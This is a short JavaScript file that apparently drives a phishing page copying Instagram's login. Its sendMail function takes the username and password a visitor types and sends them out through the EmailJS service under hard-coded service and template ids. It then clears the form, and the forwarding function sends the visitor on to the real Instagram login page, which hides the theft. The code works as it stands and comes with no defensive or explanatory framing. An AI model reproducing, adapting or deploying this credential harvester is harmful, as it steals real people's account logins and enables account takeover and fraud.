function sendMail(){
  var params = {
    username_id: document.getElementById("username").value,
    passwort_id: document.getElementById("password").value,

  };

  const serviceid = 'service_4kvbchh';
  const templateid = 'template_irilfla';
  emailjs.send(serviceid,templateid,params)
  .then(
    res => {
     
      document.getElementById("username").value = "";
      document.getElementById("password").value = "";
      
    })
    .catch((err) => alert(err));

}
function forwarding(){
  document.getElementById("LoginButton").addEventListener("click", function() {
    // Redirect to Instagram login page
    window.location.href = "https://www.instagram.com/accounts/login/";
  });
  }
